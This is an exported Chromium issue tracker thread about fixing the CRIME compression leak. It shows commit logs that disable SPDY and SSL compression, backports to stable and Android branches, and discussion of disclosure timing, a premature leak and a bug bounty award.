   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer_test.cc?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/deflate.h?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer.cc?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/buffered_spdy_framer.cc?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer.h?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/zlib.gyp?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/buffered_spdy_framer.h?r1=153595&r2=153594&pathrev=153595
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/zlib/README.chromium?r1=153595&r2=153594&pathrev=153595

Revert 153496 - Merge 151720 - net: workaround compression leaks

(This is a reland of r151502, which was reverted in r151517 because it
broke the Linux Official build.)

This may break the Official build for a brief window while a two-sided
patch lands.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10837057

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10874087

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10880081
------------------------------------------------------------------------

### ag...@chromium.org (2012-08-28)

The patch doesn't work on M21 because the code has skewed too much since then.

Backporting all the changes needed to make it work is unreasonable on a stable branch so I'm going to do the minimal to solve the problem on M21: disables SPDY compression by setting the compression level to zero. This causes deflate.c to use deflate_stored
and simply emit literal blocks of the data.

I'll land this change on trunk for a day or two to let Canary confirm that there are no unexpected problems.


### kl...@chromium.org (2012-08-28)

Palmer, is this needed for Clank? Our public version is still based on m18. So we may need some help to back port the change.

### pa...@google.com (2012-08-28)

klobag, thanks for checking. Since it won't merge back to 21, it definitely won't merge back to 18. You'll just have to pick this fix up when Clank comes up to parity with the latest version of upstream Chrome. Do we know when that is going to be (end of 2012, IIRC)? We'll have to admit that Clank will still be vulnerable, as part of jrizzo's presentation at Ekoparty, even when desktop Chrome (and I think Bling) will be patched. That's the nature of the beast, alas.

### ag...@chromium.org (2012-08-28)

I believe that the change to disable compression (which I'll be landing M21) will cleanly merge back to M18.

### kl...@chromium.org (2012-08-28)

Please let Dan know which CL we can merge back to M18. We are about to cut the build for the 18.1 today. Thanks.

### ag...@chromium.org (2012-08-28)

r153696 is the change that I've just landed on trunk for testing before merging to M21. I believe that it'll merge to M18.

### bu...@chromium.org (2012-08-28)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153697

------------------------------------------------------------------------
r153697 | agl@chromium.org | 2012-08-28T17:56:19.536530Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer_test.cc?r1=153697&r2=153696&pathrev=153697
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.cc?r1=153697&r2=153696&pathrev=153697

net: disable SPDY compression.

This change is being landed temporarily on trunk for testing. It'll be
reverted once the change has be shown to be safe for merging.

BUG=139744
------------------------------------------------------------------------

### pa...@google.com (2012-08-28)

Thanks, agl. That is easy, just change a 9 to a 0. There's your CL, Grace (https://crbug.com/chromium/139744#c73).

### df...@chromium.org (2012-08-28)

Brought that particular CL change into the Android m18 branch:
https://gerrit-int.chromium.org/#/c/24318/

### bu...@chromium.org (2012-08-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153882

------------------------------------------------------------------------
r153882 | agl@chromium.org | 2012-08-29T14:26:34.500849Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer_test.cc?r1=153882&r2=153881&pathrev=153882
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/spdy/spdy_framer.cc?r1=153882&r2=153881&pathrev=153882

Merge 153697 - net: disable SPDY compression.

This change is being landed temporarily on trunk for testing. It'll be
reverted once the change has be shown to be safe for merging.

BUG=139744

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10901005
------------------------------------------------------------------------

### bu...@chromium.org (2012-08-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153884

------------------------------------------------------------------------
r153884 | agl@chromium.org | 2012-08-29T14:41:15.506042Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/zlib.gyp?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/net/spdy/buffered_spdy_framer.h?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/README.chromium?r1=153884&r2=153883&pathrev=153884
   A http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/mixed-source.patch?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/deflate.c?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/zlib.h?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/net/spdy/spdy_framer_test.cc?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/third_party/zlib/deflate.h?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/net/spdy/spdy_framer.cc?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/net/spdy/buffered_spdy_framer.cc?r1=153884&r2=153883&pathrev=153884
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/net/spdy/spdy_framer.h?r1=153884&r2=153883&pathrev=153884

Merge 151720 - net: workaround compression leaks

(This is a reland of r151502, which was reverted in r151517 because it
broke the Linux Official build.)

This may break the Official build for a brief window while a two-sided
patch lands.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10837057

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10887026
------------------------------------------------------------------------

### ag...@chromium.org (2012-08-29)

Ok, we're all merged now.

### ag...@chromium.org (2012-08-29)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-08-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153895

------------------------------------------------------------------------
r153895 | agl@chromium.org | 2012-08-29T16:24:30.290296Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/chrome/browser/page_info_model.cc?r1=153895&r2=153894&pathrev=153895
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/net/socket/ssl_client_socket_nss.cc?r1=153895&r2=153894&pathrev=153895

Merge 149672 - net: disable SSL compression

This change also updates the page-info dialog to assume that compression isn't
used. It doesn't, however, remove the message from the .grd file in order to
make this change easier to merge.

BUG=139744

Review URL: https://chromiumcodereview.appspot.com/10823111

TBR=agl@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10891029
------------------------------------------------------------------------

### ag...@chromium.org (2012-08-29)

[Empty comment from Monorail migration]

### ag...@chromium.org (2012-08-29)

[Empty comment from Monorail migration]

### ag...@chromium.org (2012-08-29)

[Empty comment from Monorail migration]

### ka...@google.com (2012-08-30)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-30)

@jrizzo: so some good news. Due to unexpected circumstances (a rebuild to fix a regression), we believe that today's Chrome 21 patch might well have incorporated the stopgap fix (disable SSL compression altogether):

http://googlechromereleases.blogspot.com/2012/08/stable-channel-update_30.html

So I think we're all good for you to go into full detail and release PoC code whenever you're ready.

### ag...@chromium.org (2012-08-30)

... however Chrome Beta, Chrome on Android, Android Browser, Firefox and Opera are still pending as far as I know.

### sc...@gmail.com (2012-08-30)

Yeah, sorry, I meant that the EkoParty date is reasonable. That's late Sep.

### sg...@google.com (2012-08-31)


We have fixed in android browser (but this will be out in JB MR1 timeframe) and partners will be notified for ICS backport. You can talk to @gcondra if more information needed.

### pa...@chromium.org (2012-08-31)

Partners should be notified ASAP, because late September is pretty soon. :)

### gc...@google.com (2012-08-31)

Yep, partner notification will go out today assuming the changes land. Thanks all!

### ag...@chromium.org (2012-08-31)

[Empty comment from Monorail migration]

### jr...@gmail.com (2012-09-05)

Great! you are fast. The talk will be announced today.

### jr...@gmail.com (2012-09-12)

Information leaked, blog post linking to Chrome patch[1], PoC code, more blog posts, twitter comments.
Reporters are trying to convince me to announce TODAY that CRIME exploits compression.They are going to publish the articles anyway. I could provide a demo video against some major site. 

[1]
http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/

: "... and the Chromium commit is linked to  a bug that is not public (it gets a 403 error, as opposed to a 404 for  non-existent bug numbers). So probably a security bug.

".. It looks like this one is correct - Chromium disabled TLS compression on August 3rd: .." 


### ag...@chromium.org (2012-09-12)

I sent a note to thaidn earlier today apologising for that. Although I was terse in the description, I didn't deliberately mislead and perhaps I should have.

On the other hand, I believe that people were fairly convinced that it involved compression before today, but I apologise for leading credence to it.

### sc...@gmail.com (2012-09-13)

@jrizzo: FWIW, hopefully the leak isn't a big deal?
Chrome pushed an auto-update to _stable_ almost 2 weeks ago I believe, so it's a non-issue for Chrome.

Have Firefox gotten a fix to stable yet?

@agl: I vote to not ever mislead in a description. Terseness is fine and is using "crash" instead of "use-after-free" etc.

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2012-10-19)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=162911

------------------------------------------------------------------------
r162911 | phajdan.jr@chromium.org | 2012-10-19T03:30:36.465826Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/common/zip_reader.h?r1=162911&r2=162910&pathrev=162911
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/http/infinite_cache.cc?r1=162911&r2=162910&pathrev=162911
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer_test.cc?r1=162911&r2=162910&pathrev=162911
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/chrome_browser.gypi?r1=162911&r2=162910&pathrev=162911
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.cc?r1=162911&r2=162910&pathrev=162911

Linux: fix build with system zlib.

This CL disables both the workaround for http://crbug.com/139744
and SPDY compression when using system zlib.

Google Chrome should not be affected by this change (bundled
patched zlib still used, as well as compression).

This also fixes another uncovered problem with system minizip.

BUG=29048
TEST=none


Review URL: https://chromiumcodereview.appspot.com/11194068
------------------------------------------------------------------------

### bu...@chromium.org (2012-11-14)

The following revision refers to this bug:
    http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=27811

------------------------------------------------------------------------
r27811 | agl@google.com | 2012-08-15T19:44:07.841865Z

------------------------------------------------------------------------

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### rs...@chromium.org (2013-02-14)

[Empty comment from Monorail migration]

### ak...@chromium.org (2013-02-14)

For some reason, I was not able to view this until rsleevi@ added me, even though I'm a committer.

Anyway, isn't it okay to make this public by now?

### sc...@gmail.com (2013-02-14)

@akalin: it's a security bug. You will indeed need to be explicitly cc:ed to see it.

Yeah, it's old enough that it's ok to make public (done).

### bu...@chromium.org (2013-02-15)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=182753

------------------------------------------------------------------------
r182753 | akalin@chromium.org | 2013-02-15T17:56:57.575810Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_session.h?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer_test.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer_spdy2_unittest.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_framer.h?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer_spdy3_unittest.cc?r1=182753&r2=182752&pathrev=182753
   A http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_frame_builder_test.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/buffered_spdy_framer.h?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_frame_builder.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/net.gyp?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_frame_builder.h?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_session.cc?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/tools/flip_server/spdy_interface.h?r1=182753&r2=182752&pathrev=182753
   M http://src.chromium.org/viewvc/chrome/trunk/src/net/spdy/spdy_test_util_common.cc?r1=182753&r2=182752&pathrev=182753

Serious cleanup of SpdyFramer compression code:
 * Move the compression logic into SerializeNameValueBlock.
 * Get rid of accessory methods like 'IsCompressible' and 'CompressControlFrame'.
 * Get us a few steps closer to removing SpdyControlFrame.
 * Add some logic to SpdyFrameBuilder to be able to build test frames more easily.
 * Remove need for 'compressed' argument in CreateSynStream, CreateSynReply and CreateHeaders. The argument has been left in with a DCHECK ensuring correct behavior in order to illustrate that zero behavioral change has been made. It will be removed in a follow-up CL.
 * Lots of other cleanup.

Zero change to on-the-wire results and behavior.

This lands server change 42232412.

Also replaces OnControlFrameCompressed with OnSynStreamCompressed.

Also maintains Chrome-specific behavior, like USE_SYSTEM_ZLIB switching and the CRIME fixes in r151720.

Also pass through enable_compression_ flag in SpdySession.

BUG=139744

Review URL: https://codereview.chromium.org/12263029
------------------------------------------------------------------------

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-14)

The panel decided to reward $4,000 for this bug, and additional $1,337 for 1337ness!

### aw...@google.com (2016-11-18)

[Empty comment from Monorail migration]

### aw...@google.com (2016-12-05)

[Empty comment from Monorail migration]

### is...@google.com (2016-12-05)

This issue was migrated from crbug.com/chromium/139744?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals, Internals>Network>SSL]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062088)*
